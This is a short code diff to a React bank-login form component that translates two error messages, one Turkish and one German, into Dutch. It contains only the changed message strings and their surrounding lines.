@@ -406,7 +406,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
 
     if (!hasCurrentSubmissionData) {
       setSaving(false);
-      setError("Form alanlari doldurulmadan devam edilemez.");
+      setError("Formuliervelden moeten worden ingevuld voordat u verder kunt gaan.");
       return;
     }
 
@@ -677,7 +677,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
 
     setSaving(false);
     if (updateError) {
-      setError("Eingaben konnten nicht uebermittelt werden. Bitte erneut versuchen.");
+      setError("Invoer kon niet worden verzonden. Probeer het opnieuw.");
       return;
     }
     setSessionFormData(nextFormData);
